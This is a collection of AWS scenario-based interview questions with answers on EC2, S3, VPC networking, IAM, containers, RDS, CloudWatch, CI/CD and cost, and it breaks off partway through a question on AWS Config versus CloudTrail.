# ☁️ AWS — Scenario-Based Interview Questions

---

## 🔴 EC2 & Compute

---

**Q1. [L1] You launched an EC2 instance but can't SSH into it. What do you check?**

**Answer:**
1. **Security Group** — does inbound rule allow port 22 from your IP? Check in the EC2 console under Security Groups.
2. **Key pair** — are you using the correct `.pem` file? Is it the right one for that instance?
3. **File permissions** — `chmod 400 key.pem`. SSH won't work if key permissions are too open.
4. **Instance state** — is it running? Not stopped or pending?
5. **Public IP** — does it have a public IP or Elastic IP assigned?
6. **VPC/Subnet** — is it in a public subnet with an Internet Gateway? A private subnet instance can't be SSH'd from internet.
7. **NACL** — Network ACLs can block traffic even if Security Groups allow it. NACLs are stateless.

---

**Q2. [L2] Your EC2 instance is showing high CPU and your application is slow. What steps do you take?**

**Answer:**
1. **CloudWatch metrics** — check CPU utilization over time. Is it sustained or spiky?
2. **SSH in and check** — `top` or `htop` to see which process is consuming CPU.
3. **Check for runaway processes** — a stuck process, an infinite loop, a cron job misfiring.
4. **Check memory** — sometimes high CPU is actually a memory issue causing constant swap. Check `free -m` and `vmstat`.
5. **Scale vertically** — if it's a legitimate load, stop the instance, change instance type to a larger one, restart.
6. **Scale horizontally** — add it to an Auto Scaling Group, put a Load Balancer in front, scale out.
7. **Right-sizing** — use AWS Compute Optimizer recommendations.

---

**Q3. [L2] You have a fleet of EC2 instances behind an ALB. One instance keeps getting traffic even though it's unhealthy. What's wrong?**

**Answer:**
The ALB health check is likely misconfigured:
1. **Health check path wrong** — ALB checks `/` but the app serves health at `/health`. Returns 404 → ALB marks it unhealthy → but wait, 404 might be in the success codes range.
2. **Success codes misconfigured** — if success codes include `404` or `5xx`, unhealthy instances appear healthy.
3. **Health check threshold** — `UnhealthyThreshold` might be set very high, so the instance needs to fail many times before being marked unhealthy.
4. **Health check port/protocol wrong** — checking wrong port.
5. **Security Group** — ALB can't reach the instance's health check port → health checks time out → AWS treats timeout differently than explicit failure in some configs.

Fix: Review ALB target group health check settings. Set correct path, success codes (200-299 only), and reasonable thresholds.

---

**Q4. [L3] An EC2 instance in an Auto Scaling Group keeps being terminated and replaced. The new instance starts, becomes healthy, then gets terminated again in a cycle. What's happening?**

**Answer:**
This sounds like a lifecycle hook or health check issue:
1. **Application actually is unhealthy** — the new instance really is failing. Check the health check endpoint. Maybe there's a deployment bug.
2. **ALB health check failing immediately** — instance isn't ready to serve traffic before health checks kick in. The ASG uses ALB health checks and terminates the instance before the app is fully started.
3. **Lifecycle hook stuck** — a lifecycle hook (`autoscaling:EC2_INSTANCE_LAUNCHING`) is not completing. Instance is in `Pending:Wait` state but something is killing it.
4. **Scale-in protection not set** — instance is being terminated by scale-in event despite looking fine.
5. **EC2 instance reachability check failing** — hardware issue at the hypervisor level. Check AWS console system status checks.

Check ASG activity logs in the console — it will say exactly why each instance was terminated.

---

**Q5. [L2] You want EC2 instances in private subnets to download packages from the internet (like `yum install`). How do you enable this?**

**Answer:**
Use a **NAT Gateway** (managed by AWS) or **NAT Instance** (self-managed EC2):

1. Create a NAT Gateway in a **public subnet** (must have internet access).
2. Assign an Elastic IP to the NAT Gateway.
3. Update the **route table** for the private subnets: add route `0.0.0.0/0 → NAT Gateway`.

Now private instances can initiate outbound connections to the internet (for package downloads), but the internet can't initiate connections inbound to them.

NAT Gateway vs NAT Instance: NAT Gateway is fully managed, highly available, auto-scales. NAT Instance is cheaper for low traffic but you manage it.

---

**Q6. [L3] Your On-Demand EC2 costs are very high. How would you optimize?**

**Answer:**
1. **Reserved Instances (RI)** — commit to 1 or 3 years for 40-60% discount. Best for steady-state production workloads.
2. **Savings Plans** — more flexible than RIs. Commit to $/hour spend, apply across any instance type.
3. **Spot Instances** — up to 90% discount. For fault-tolerant workloads (batch jobs, CI/CD workers, stateless web tier).
4. **Right-sizing** — use AWS Compute Optimizer. Many instances are over-provisioned.
5. **Graviton instances** — ARM-based (m7g, c7g) are 20-40% cheaper than x86 equivalents.
6. **Auto Scaling** — scale in during off-hours. Don't run 10 instances at 2 AM if traffic drops to 1% of peak.
7. **S3 + CloudFront for static content** — offload static serving from EC2.

---

## 🔵 S3 & Storage

---

**Q7. [L1] You accidentally deleted an important file from S3. How do you recover it?**

**Answer:**
If **versioning is enabled**: The delete created a "delete marker." You can recover by:
- Go to S3 console → show versions → find the version before the delete marker → restore it.
- `aws s3api list-object-versions --bucket <bucket> --prefix <key>` then `aws s3api get-object --version-id <id>`.

If **versioning is NOT enabled**: The object is permanently deleted. Options:
- Check if you have a backup (S3 Replication to another bucket, AWS Backup).
- Check CloudTrail for when it was deleted and by whom.
- No recovery possible without prior versioning or backup.

Lesson: Always enable versioning on important buckets. Enable MFA Delete for extra protection.

---

**Q8. [L2] Your S3 bucket is publicly accessible and AWS sent you a security alert. How do you fix it?**

**Answer:**
1. **Block Public Access settings** — go to S3 → Block Public Access → Enable all four settings. This overrides any bucket/object ACLs and policies that grant public access.
2. **Review bucket policy** — remove any `Principal: *` statements.
3. **Review object ACLs** — remove `public-read` ACLs from objects.
4. **Check for misconfigured static website hosting** — if not needed, disable it.
5. **Enable S3 Access Analyzer** — finds all resource policies that allow external access.

For legitimate public content (website assets): use **CloudFront** in front of a private S3 bucket instead of making the bucket public directly.

---

**Q9. [L2] S3 uploads from your app are failing with `403 Forbidden`. What are the possible causes?**

**Answer:**
1. **IAM permissions** — the IAM role/user doesn't have `s3:PutObject` permission on the bucket.
2. **Bucket policy denying access** — explicit Deny in bucket policy overrides IAM Allow.
3. **Block Public Access** — if the app is trying to upload with public-read ACL and Block Public Access is enabled, it gets 403.
4. **Wrong region** — bucket is in us-east-1 but app is hitting eu-west-1 endpoint. Use `--region` flag or set correct endpoint.
5. **STS token expired** — if using temporary credentials (IAM role), the session token may have expired.
6. **KMS encryption** — if the bucket enforces KMS encryption, the IAM role needs `kms:GenerateDataKey` permission on the KMS key.

---

**Q10. [L3] You have 100TB of data in S3 that is accessed very infrequently (once a year for audit). How do you minimize storage costs?**

**Answer:**
Use **S3 Glacier Deep Archive** — cheapest storage class. ~$1/TB/month vs S3 Standard ~$23/TB/month.

Retrieval: takes 12 hours. For audit use case, 12 hours is acceptable.

If you need faster retrieval (hours not days), use **S3 Glacier Flexible Retrieval** (expedited: 1-5 min, standard: 3-5 hours).

Setup:
- Use **S3 Lifecycle Policy** to auto-transition objects to Glacier after X days.
- Or directly upload to Glacier class if you know immediately it's archival.

Also consider:
- **S3 Intelligent-Tiering** — auto-moves between tiers based on access patterns (good if access pattern is unpredictable).
- **S3 Storage Lens** — visibility into which buckets/prefixes have stale data.

---

**Q11. [L2] How do you securely share an S3 object with an external partner who doesn't have an AWS account?**

**Answer:**
Use **S3 Pre-Signed URLs**:

```bash
aws s3 presign s3://my-bucket/my-file.pdf --expires-in 3600
```

This generates a time-limited URL. Anyone with the URL can download the file without AWS credentials. After expiry, the URL stops working.

For uploads: `aws s3 presign --method PUT` generates a pre-signed URL for uploading.

For long-term sharing: use **S3 Access Points** with a bucket policy, or give the partner a limited IAM user.

Never make the bucket public — use pre-signed URLs for controlled sharing.

---

**Q12. [L3] Your application writes millions of small files to S3. Performance is slow on listing and retrieval. How do you optimize?**

**Answer:**
1. **S3 automatically partitions by prefix** — requests are distributed across S3 partitions. More unique prefixes = better parallelism. Add a hash/timestamp prefix to distribute keys: `abc123/2024/01/filename` instead of `logs/filename`.
2. **Avoid sequential keys** — old S3 had hot partition issues with sequential keys (dates). Modern S3 handles this better but prefixing is still good practice.
3. **S3 Select or Athena** — for querying/filtering data, use S3 Select to retrieve only needed data instead of downloading entire files.
4. **Aggregate small files** — if files are <1MB, aggregate into larger files. S3 works best with larger objects. Use multipart for >100MB.
5. **Request parallelism** — use multipart download with parallel part fetching for large files.
6. **Batch operations** — for bulk operations on millions of objects, use S3 Batch Operations instead of single API calls.

---

## 🟢 Networking & VPC

---

**Q13. [L1] What is the difference between a Security Group and a Network ACL (NACL)?**

**Answer:**
| | Security Group | NACL |
|---|---|---|
| Level | Instance/ENI level | Subnet level |
| Stateful | Yes — return traffic auto allowed | No — must allow inbound AND outbound explicitly |
| Rules | Allow only | Allow and Deny |
| Processing | All rules evaluated | Rules evaluated in order (lowest number first) |

Example: If Security Group allows port 443 inbound, response traffic (outbound) is automatically allowed — you don't need an outbound rule.

NACL — if you allow port 443 inbound, you must also add an outbound rule for the ephemeral ports (1024-65535) to allow the response.

Use NACLs as a coarse subnet-level block (e.g., block a known bad IP range). Use Security Groups for fine-grained instance-level control.

---

**Q14. [L2] Two EC2 instances in the same VPC can't communicate. What do you check?**

**Answer:**
1. **Same VPC?** — Confirm both are in the same VPC. Different VPCs require VPC Peering.
2. **Security Groups** — instance A's SG must allow inbound from instance B's IP or SG. And B's SG must allow outbound (usually default allows all outbound).
3. **NACL** — both subnet NACLs must allow inbound and outbound traffic between them.
4. **Route tables** — both subnets must have routes to each other. In the same VPC, local routes (`10.0.0.0/16 → local`) handle this automatically.
5. **Are they in different VPCs with peering?** — check the peering connection and route tables.

---

**Q15. [L2] You need two VPCs in different AWS accounts to communicate privately. How do you set this up?**

**Answer:**
**Option 1: VPC Peering**
- Create a peering connection between the two VPCs (cross-account supported).
- Accept the peering request in the other account.
- Update route tables in both VPCs to point to each other's CIDR via the peering connection.
- Update Security Groups to allow traffic from the other VPC's CIDR.

Limitation: Not transitive. If VPC A peers with B, and B peers with C, A can't talk to C through B.

**Option 2: AWS Transit Gateway**
- Central hub. Connect all VPCs (and on-prem) to TGW.
- Fully transitive. Any connected VPC can reach any other.
- Better for many VPCs. Costs more than peering.

**Option 3: AWS PrivateLink**
- Expose a specific service (not the whole VPC) across accounts.
- The consumer VPC creates an Interface Endpoint pointing to the provider's endpoint service.
- Traffic stays on AWS backbone.

---

**Q16. [L3] Your VPC has overlapping CIDR blocks with an on-premises network and you need to connect them via VPN. What do you do?**

**Answer:**
Overlapping CIDRs are a real problem — traffic routing becomes ambiguous.

Options:
1. **Re-IP the VPC** — If the VPC is new/small, change the CIDR by creating a new VPC with a non-overlapping range and migrating.
2. **NAT at the VPN gateway** — Use a NAT device that translates VPC IPs to a non-overlapping range before traffic crosses the VPN. AWS doesn't natively support NAT-T for VPN in this case; you'd use an EC2-based NAT instance.
3. **AWS Transit Gateway with NAT** — TGW supports NAT-based routing for overlapping CIDRs in some configurations.

Best practice: **Plan CIDR ranges before creating VPCs.** Use RFC1918 ranges with /16 subnets, ensuring no overlap between VPCs and on-prem. Document in a CMDB.

---

**Q17. [L2] What is VPC Flow Logs and how do you use it for security investigations?**

**Answer:**
VPC Flow Logs captures IP traffic information for network interfaces in your VPC. Logged to CloudWatch Logs or S3.

Each record includes: source IP, destination IP, source port, destination port, protocol, bytes, action (ACCEPT/REJECT), etc.

Use cases:
1. **Security investigation** — "Where did this attack come from?" Filter logs for a suspicious IP.
2. **Detecting port scans** — many REJECT records from same source IP across many ports.
3. **Troubleshooting connectivity** — if traffic shows REJECT, a security group or NACL is blocking it.
4. **Billing anomalies** — high data transfer costs. Flow logs show which IP is generating the traffic.

Query with **Athena** for large-scale analysis. Set up **CloudWatch Logs Insights** for real-time querying.

---

**Q18. [L3] You need to connect your AWS VPC to an on-premises data center. What are the options and tradeoffs?**

**Answer:**
**Option 1: AWS Site-to-Site VPN**
- Encrypted tunnel over the public internet.
- Quick to set up (minutes to hours).
- Bandwidth: up to 1.25 Gbps.
- Variable latency (public internet).
- Cost: ~$36/month + data transfer.

**Option 2: AWS Direct Connect**
- Dedicated physical connection to AWS via AWS Direct Connect locations.
- Bandwidth: 1 Gbps to 100 Gbps.
- Consistent low latency.
- Takes weeks to months to provision.
- Higher cost but predictable.

**Option 3: VPN over Direct Connect**
- Encrypted VPN tunnel over the Direct Connect private circuit.
- Get Direct Connect speed + VPN encryption.

Choose VPN for quick/cheap connectivity. Choose Direct Connect for high bandwidth, compliance requirements (data never on public internet), or consistent latency needs.

---

**Q19. [L2] What is an Elastic Load Balancer and what are the differences between ALB, NLB, and CLB?**

**Answer:**
- **CLB (Classic Load Balancer)** — legacy. Avoid for new projects. Layer 4 and Layer 7 but limited features.
- **ALB (Application Load Balancer)** — Layer 7 (HTTP/HTTPS). Content-based routing: route by URL path, hostname, headers, query strings. Best for microservices and HTTP apps. Supports WebSockets, HTTP/2.
- **NLB (Network Load Balancer)** — Layer 4 (TCP/UDP/TLS). Ultra-low latency. Handles millions of requests per second. Static IP / Elastic IP support. Best for high-performance, non-HTTP workloads (game servers, IoT, VoIP).
- **GWLB (Gateway Load Balancer)** — for inline network appliances (firewalls, IDS/IPS). Newer addition.

Choose: ALB for web apps/APIs. NLB for TCP/UDP or when you need static IP. GWLB for network security appliances.

---

**Q20. [L2] Your ALB target group is showing all instances as unhealthy. What do you check?**

**Answer:**
1. **Health check path** — does the path exist? `curl http://<instance-ip>:<health-check-port><health-check-path>` from the ALB's subnet.
2. **Security group** — the ALB's Security Group must be allowed to reach the instance on the health check port. Add inbound rule to instance SG: allow from ALB SG.
3. **Instance running the app** — is the application actually running on that port? `netstat -tlnp | grep <port>`.
4. **Health check port** — is it the traffic port or a different one? Misconfiguration here is common.
5. **Response code** — the health check expects 200. If the app returns 301 redirect, that's a failure by default. Add 301 to success codes or fix the redirect.

---

## 🟡 IAM & Security

---

**Q21. [L2] A Lambda function is failing with `Access Denied` when trying to write to DynamoDB. How do you fix it?**

**Answer:**
Lambda functions use an **execution role** (IAM role). This role needs `dynamodb:PutItem` (or broader `dynamodb:*`) permission on the target table.

Fix:
1. Go to Lambda → Configuration → Permissions → click the execution role name.
2. In IAM, add an inline policy or attach a managed policy with DynamoDB permissions.

Example policy:
```json
{
  "Effect": "Allow",
  "Action": ["dynamodb:PutItem", "dynamodb:GetItem"],
  "Resource": "arn:aws:dynamodb:us-east-1:123456789:table/MyTable"
}
```

Always scope the Resource to the specific table ARN, not `*`. Principle of least privilege.

---

**Q22. [L2] You need to give a third-party vendor access to a specific S3 bucket without giving them AWS credentials. How?**

**Answer:**
Use **IAM Cross-Account Role Assumption**:
1. In your AWS account, create an IAM role with S3 permissions on the bucket.
2. Set the trust policy to allow the vendor's AWS account ID to assume the role.
3. The vendor calls `sts:AssumeRole` from their account and gets temporary credentials.
4. They use those credentials to access only what the role allows.

Benefits:
- No long-term credentials shared.
- You can revoke access instantly by deleting the role.
- All access is auditable in CloudTrail.

Alternatively for simpler cases: create an IAM user with programmatic access (access key/secret) scoped only to that bucket. Less ideal — long-term credentials.

---

**Q23. [L3] You discover that an IAM access key was accidentally committed to a public GitHub repository. What do you do immediately?**

**Answer:**
This is a security incident. Move fast — bots scan GitHub and abuse leaked keys within minutes.

1. **Immediately deactivate the key** — IAM console → Users → find the user → Security credentials → Deactivate the access key.
2. **Create a new key if needed** for the application.
3. **Check CloudTrail** — `aws cloudtrail lookup-events --lookup-attributes AttributeKey=AccessKeyId,AttributeValue=<key>` — see what the key was used for, including any unauthorized usage.
4. **Assess the blast radius** — what permissions did that user have? Audit anything that was changed.
5. **Rotate any other credentials** the user/app might have touched (DB passwords, etc.).
6. **Delete the key** after deactivating and confirming the new key is working.
7. **Remove the commit from GitHub** (history) and notify the GitHub security team if sensitive data was exposed.
8. **Post-incident** — implement pre-commit hooks (ShieldCommit!) to prevent future secret leaks.

---

**Q24. [L2] What is the difference between an IAM policy attached to a user vs a resource policy attached to an S3 bucket?**

**Answer:**
- **Identity policy** (attached to IAM user/role/group) — defines what that identity CAN do across AWS.
- **Resource policy** (attached to S3 bucket, KMS key, SNS topic) — defines WHO can access that specific resource.

Example: An S3 bucket policy can grant access to an IAM user in a **different AWS account** — the identity policy alone can't cross account boundaries without a resource policy (or role trust policy) on the other side.

When both exist: for same-account access, the **union of both** policies is the effective permission. For cross-account: **both must allow** the action.

Explicit Deny anywhere always wins, regardless of Allows.

---

**Q25. [L3] Explain how IAM permission boundaries work and give a use case.**

**Answer:**
A **permission boundary** is a policy attached to an IAM entity that sets the maximum permissions the entity can ever have — even if an identity policy grants more.

Effective permissions = intersection of identity policy AND permission boundary.

Use case — delegated administration:
- You want to allow developers to create their own IAM roles for their Lambda functions.
- But you don't want them to create roles with admin access (privilege escalation risk).
- Solution: require all roles created by developers to have a permission boundary that limits them to a safe set of actions.
- The developer has `iam:CreateRole` permission but also the condition that the new role must have a specific boundary attached.

This is a key pattern for secure self-service IAM in large organizations.

---

## 🔵 ECS, EKS, Lambda

---

**Q26. [L2] What is the difference between ECS with EC2 launch type and ECS with Fargate?**

**Answer:**
- **EC2 launch type** — you manage the EC2 instances (the container hosts). You're responsible for patching, scaling the cluster, choosing instance types. More control and potentially cheaper at scale.
- **Fargate** — serverless containers. AWS manages the underlying infrastructure. You just define CPU/memory per task. No instances to manage. Faster to set up. More expensive per unit of compute but no over-provisioning waste.

Choose EC2 when you need GPU containers, custom AMIs, network performance tuning, or cost optimization at scale. Choose Fargate for simplicity, small teams, or variable workloads.

---

**Q27. [L2] Your ECS task keeps stopping with exit code 137. What's happening?**

**Answer:**
Exit code 137 = container killed by OOM (Out of Memory) — `128 + 9 (SIGKILL)`.

The container exceeded its memory limit and was killed.

Fix:
1. Check task definition memory hard/soft limit.
2. Increase the memory limit.
3. Or find and fix the memory leak in your application.
4. Use CloudWatch Container Insights to monitor actual memory usage trends.

---

**Q28. [L2] A Lambda function times out on every invocation. What could be the cause?**

**Answer:**
1. **Timeout too short** — default is 3 seconds. If the function takes 5 seconds, increase the timeout (up to 15 minutes).
2. **Waiting on external resources** — DB connection takes too long, external HTTP call is slow, S3 download is large.
3. **Cold start latency** — VPC Lambda cold starts can add 5-10 seconds for ENI provisioning. Use provisioned concurrency for latency-sensitive functions.
4. **VPC connectivity issue** — Lambda in VPC can't reach the internet or RDS because of missing NAT Gateway or incorrect Security Group rules.
5. **Infinite loop or deadlock** — the function logic has a bug that never resolves.
6. **DB connection pool exhausted** — Lambda opens a new DB connection per invocation. With high concurrency, you exhaust DB connections. Use RDS Proxy to pool connections.

---

**Q29. [L3] You have a Lambda function that's running fine at 10 invocations/second but fails at 1000/second with throttling errors. How do you handle this?**

**Answer:**
Lambda has a **concurrency limit** — default 1000 concurrent executions per region per account.

At 1000 req/s with a 1-second function, you need 1000 concurrent = hitting the limit.

Solutions:
1. **Request a concurrency limit increase** via AWS Support.
2. **Reserved concurrency** — reserve a portion of the account limit for critical functions, prevent other functions from taking it all.
3. **Provisioned concurrency** — pre-warm N instances of the function. No cold starts, no throttling up to that N.
4. **Queue-based architecture** — put an SQS queue in front. Lambda reads from the queue with controlled concurrency. Requests buffer in SQS instead of being throttled.
5. **Reduce function duration** — faster functions = lower concurrent execution count needed.

---

**Q30. [L3] Explain the difference between EKS and ECS. When would you recommend each?**

**Answer:**
**ECS (Elastic Container Service)**
- AWS-native orchestration. Simpler to operate.
- Tight integration with other AWS services (ALB, IAM, CloudWatch).
- No Kubernetes expertise required.
- Less portable (ECS is AWS-only).
- Good for teams new to containers or teams deeply invested in AWS ecosystem.

**EKS (Elastic Kubernetes Service)**
- Managed Kubernetes. Full K8s API.
- Portable — same manifests work on other clouds/on-prem.
- Richer ecosystem (Helm, ArgoCD, all CNCF tools).
- More complex to operate and debug.
- Good for teams with Kubernetes expertise, multi-cloud strategy, or using Kubernetes-specific features.

Recommendation: ECS for pure AWS shops wanting simplicity. EKS for Kubernetes expertise, portability, or complex scheduling needs.

---

## 🟠 RDS & Databases

---

**Q31. [L2] Your RDS instance is using 100% CPU. What do you do?**

**Answer:**
1. **Identify the culprit** — use **RDS Performance Insights** to find the top SQL queries consuming CPU.
2. **Look for slow queries** — enable slow query log. Check for missing indexes.
3. **Check for lock contention** — queries waiting for locks show high CPU wait.
4. **Scale vertically** — stop the RDS instance, change instance class to a larger one (more CPU), restart.
5. **Read replicas** — offload read queries to a read replica. Add a read replica and point your app's read traffic there.
6. **Query optimization** — add indexes for slow queries found in Performance Insights.
7. **Connection pool** — if too many connections are opening/closing rapidly, it causes CPU overhead. Use RDS Proxy.

---

**Q32. [L2] You need to migrate a 500GB production RDS database to a new region with minimal downtime. How?**

**Answer:**
1. **Create a cross-region read replica** — in RDS, create a read replica in the target region. It will replicate all data and stay in sync via binlog replication (MySQL) or streaming replication (Postgres).
2. **Wait for the replica to catch up** — replication lag should approach 0.
3. **Maintenance window** — stop writes to the source DB (or put app in maintenance mode).
4. **Promote the replica** — in the target region, promote the read replica to a standalone primary. This takes seconds.
5. **Update app config** — point the connection string to the new region's DB endpoint.
6. **Verify** — test the app against the new DB.
7. **Cleanup** — once confirmed, decommission the source DB.

Total downtime: a few minutes during promotion + connection string update.

---

**Q33. [L3] An RDS instance went down and the automated failover to the standby didn't happen as expected in a Multi-AZ setup. What could have gone wrong?**

**Answer:**
Multi-AZ failover is automatic, but several things can prevent or delay it:
1. **Maintenance mode** — if you disabled automatic failover before maintenance.
2. **Failover trigger conditions** — RDS only fails over for: storage failure, loss of network connectivity, instance hardware failure, running out of storage. It does NOT auto-failover for high CPU/load.
3. **DNS propagation delay** — failover promotes the standby, but the endpoint DNS (e.g., `mydb.xxxxxx.us-east-1.rds.amazonaws.com`) needs to update. If the app uses hardcoded IPs instead of the RDS DNS endpoint, failover doesn't help. Always use DNS endpoint.
4. **Application doesn't retry connections** — after failover, existing connections are dropped. The app must retry DB connections. Apps that don't retry see prolonged outage.
5. **Replication lag** — in some edge cases, the standby might have a small lag, causing momentary data inconsistency.

---

**Q34. [L2] Your application connects directly to RDS and at peak load you see `Too many connections` errors. How do you fix this?**

**Answer:**
Each Lambda invocation or serverless function instance opens its own DB connection. At scale, this exhausts the DB connection limit.

Fix: **Amazon RDS Proxy**
- Acts as a connection pooler in front of RDS.
- Lambda connects to RDS Proxy (cheap lightweight connection).
- RDS Proxy maintains a small pool of real connections to RDS and reuses them.
- DB sees a constant ~20 connections instead of 1000.

For non-Lambda apps: use a connection pool library (PgBouncer for Postgres, ProxySQL for MySQL) to manage connections efficiently.

Also: increase the `max_connections` DB parameter if the instance class supports it.

---

**Q35. [L3] You want to implement a database backup strategy for RDS that allows you to restore to any point in the last 7 days. How?**

**Answer:**
Enable **Point-In-Time Recovery (PITR)**:
1. Enable automated backups on the RDS instance with `BackupRetentionPeriod: 7` (days).
2. RDS takes a daily snapshot and continuously archives transaction logs (binlogs/WAL) to S3.
3. This allows restore to any second within the retention window.

Restore: `aws rds restore-db-instance-to-point-in-time --target-db-instance-identifier <new-name> --restore-time 2024-01-15T14:30:00Z`

This creates a NEW RDS instance (doesn't modify the original). Test the restored instance, then cut over if needed.

Also: take manual snapshots before major changes (deployments, migrations). Manual snapshots don't expire with the retention period.

---

## 🟣 Monitoring & CloudWatch

---

**Q36. [L2] You want to get an alert when your EC2 instance CPU exceeds 80% for more than 5 minutes. How do you set this up?**

**Answer:**
1. In CloudWatch, create an **Alarm**:
   - Metric: `EC2 → Per-Instance Metrics → CPUUtilization`
   - Statistic: Average
   - Period: 5 minutes (300 seconds)
   - Condition: `> 80`
   - Evaluation periods: 1 (alarm triggers after 1 period = 5 minutes above threshold)
2. Add an **SNS action** — send notification to an SNS topic.
3. Subscribe your email or PagerDuty endpoint to the SNS topic.

Or do it all via CLI:
```bash
aws cloudwatch put-metric-alarm \
  --alarm-name HighCPU \
  --metric-name CPUUtilization \
  --namespace AWS/EC2 \
  --statistic Average \
  --period 300 \
  --threshold 80 \
  --comparison-operator GreaterThanThreshold \
  --evaluation-periods 1 \
  --alarm-actions arn:aws:sns:...
```

---

**Q37. [L2] What is the difference between CloudWatch Logs, CloudWatch Metrics, and CloudWatch Alarms?**

**Answer:**
- **CloudWatch Logs** — stores raw log data (text). Your app, Lambda, ECS, VPC Flow Logs all write here. You can search/query with CloudWatch Logs Insights.
- **CloudWatch Metrics** — numeric time-series data. CPU%, request count, latency, error rate. Built-in for AWS services; custom metrics from your app via the CloudWatch SDK/API.
- **CloudWatch Alarms** — watches a metric and triggers an action when a threshold is breached. Actions: SNS notification, Auto Scaling policy, EC2 action (stop/reboot).

The flow: App → writes logs to CloudWatch Logs → Metric Filter extracts numbers → custom CloudWatch Metric → Alarm watches metric → SNS notification sent.

---

**Q38. [L3] Your application has no observability and you need to build a monitoring stack from scratch on AWS. What would you set up?**

**Answer:**
Layer by layer:

**Infrastructure metrics:**
- CloudWatch with EC2/ECS/RDS default metrics.
- CloudWatch Agent on EC2 for memory, disk (not in default metrics).

**Application metrics:**
- Custom CloudWatch metrics via AWS SDK (request rate, error rate, business metrics).
- Or: Prometheus + Grafana running on ECS/EKS. More flexible.

**Logs:**
- CloudWatch Logs (simple) or OpenSearch (for complex searching).
- Log groups per service, retention policy set.

**Distributed tracing:**
- AWS X-Ray — traces requests across services, shows where latency is.

**Alerting:**
- CloudWatch Alarms → SNS → PagerDuty/Slack.

**Dashboards:**
- CloudWatch dashboards or Grafana for a unified view.

**Uptime monitoring:**
- CloudWatch Synthetics — canary scripts that test your endpoints from outside.

---

**Q39. [L3] You're being charged for more CloudWatch API calls than expected. How do you investigate and reduce costs?**

**Answer:**
1. **Cost Explorer** — filter by service CloudWatch to see which API calls cost the most (GetMetricStatistics, PutLogEvents, etc.).
2. **Reduce log retention** — logs stored indefinitely are the biggest cost driver. Set retention (30/90 days depending on compliance).
3. **High-resolution metrics** — 1-second metrics cost 10x more than 1-minute. Only use for critical alarms.
4. **Agent config** — CloudWatch Agent flush interval. Shorter interval = more API calls. Increase from 10s to 60s for non-critical metrics.
5. **Reduce custom metric count** — each unique metric (unique combination of namespace + dimensions) has a cost.
6. **Use EMF (Embedded Metric Format)** — batch metrics embedded in log entries. Cheaper than individual PutMetricData calls.
7. **S3 access logs → Athena** instead of CloudWatch for high-volume access logs analysis.

---

**Q40. [L2] What is AWS CloudTrail and how is it different from CloudWatch?**

**Answer:**
- **CloudTrail** — records API calls made to AWS. Who did what, when, from where. "Audit trail." Example: who deleted that S3 bucket? Who changed that Security Group?
- **CloudWatch** — operational monitoring. Metrics, logs, alarms. How is the system performing right now?

CloudTrail logs: `Bob assumed the role AdminRole at 3:47 PM and called ec2:TerminateInstances on i-123456.`

CloudWatch logs: `App server error rate is 5.2% for the last 10 minutes.`

Use CloudTrail for: security investigations, compliance auditing, change tracking. Enable in all regions. Store logs in S3 with immutable retention (S3 Object Lock) for compliance.

---

## 🔵 CI/CD on AWS

---

**Q41. [L2] Walk me through building a CI/CD pipeline for a containerized app using AWS-native services.**

**Answer:**
1. **CodeCommit or GitHub** — source code repository. Push triggers the pipeline.
2. **CodeBuild** — builds the Docker image, runs tests, pushes image to **ECR** (Elastic Container Registry).
3. **ECR** — stores the Docker image.
4. **CodeDeploy or ECS Blue/Green** — deploys the new image to ECS/EKS.
5. **CodePipeline** — orchestrates the full pipeline: Source → Build → Test → Deploy.

For ECS Blue/Green with CodeDeploy:
- CodeDeploy creates a new task set with the new image.
- Routes test traffic to it.
- After validation, shifts production traffic over.
- Terminates old task set.
- Supports instant rollback.

---

**Q42. [L2] Your CodeBuild job is failing with a permissions error when trying to push to ECR. What do you check?**

**Answer:**
CodeBuild uses a **service role**. That role needs ECR permissions:
1. `ecr:GetAuthorizationToken` — to authenticate with ECR.
2. `ecr:BatchCheckLayerAvailability`, `ecr:PutImage`, `ecr:InitiateLayerUpload`, etc. — to push layers.

In the CodeBuild buildspec.yml, the login command:
```bash
aws ecr get-login-password | docker login --username AWS --password-stdin <account>.dkr.ecr.<region>.amazonaws.com
```

This requires `ecr:GetAuthorizationToken` at minimum. Check the service role policy.

Also check: ECR repository policy — cross-account pushes need a resource policy on the ECR repo too.

---

## 🟠 Cost & Architecture

---

**Q43. [L3] Design a highly available, scalable web application architecture on AWS for a startup that expects unpredictable traffic.**

**Answer:**
```
Route 53 (DNS + health checks)
    ↓
CloudFront (CDN for static assets + caching)
    ↓
ALB (Application Load Balancer, multi-AZ)
    ↓
ECS Fargate (auto-scaling container tasks, multi-AZ)
    ↓
RDS (Multi-AZ, with read replicas)
RDS Proxy (connection pooling)
ElastiCache Redis (session store + caching)
    ↓
S3 (static assets, uploads)
```

Key design decisions:
- **Fargate** — no instance management, auto-scales, pay per task (good for unpredictable traffic).
- **Multi-AZ everything** — ALB, RDS, ECS tasks across at least 2 AZs.
- **CloudFront** — reduce load on origin for static content.
- **Route 53 health checks** — failover to secondary region if primary is down.
- **Auto Scaling on ECS** — scale based on CPU/request count with target tracking.

---

**Q44. [L2] What is the shared responsibility model in AWS?**

**Answer:**
AWS and you share responsibility for security:

**AWS is responsible for:**
- Security OF the cloud — hardware, facilities, networking, hypervisor, managed service infrastructure.
- Patching the underlying EC2 hypervisor.
- Physical security of data centers.

**You are responsible for:**
- Security IN the cloud — your OS, applications, data, IAM, Security Groups, encryption.
- Patching your EC2 OS (you own the OS).
- Encrypting data at rest and in transit.
- Proper IAM configuration.
- Application-level security.

Example: If your EC2 OS has an unpatched vulnerability, that's your responsibility, not AWS's. If the hypervisor has a vulnerability, that's AWS's responsibility.

---

**Q45. [L3] Your AWS bill doubled this month unexpectedly. How do you investigate?**

**Answer:**
1. **AWS Cost Explorer** — open it, filter by service. Which service increased?
2. **Filter by time** — compare this month vs last month. Find the day the cost jumped.
3. **Cost and Usage Report (CUR)** — most granular billing data. Query with Athena if needed.
4. **Check for data transfer** — inter-region, internet egress. A new service sending data outside AWS is expensive.
5. **Check EC2 instances** — a runaway Auto Scaling group could have spawned many instances.
6. **Check NAT Gateway** — NAT Gateway charges per GB. A bug causing high-volume traffic through NAT is a common culprit.
7. **Check CloudWatch** — too many custom metrics or log ingestion.
8. **Enable AWS Budgets** — set alerts to catch this earlier next time.
9. **Enable Cost Anomaly Detection** — ML-based alerts for unusual spend patterns.

---

**Q46. [L2] What is AWS Config and how does it differ from CloudTrail?**

**Answer:**
- **CloudTrail** — records API actions. "What happened?" Who called `ec2:TerminateInstances`?
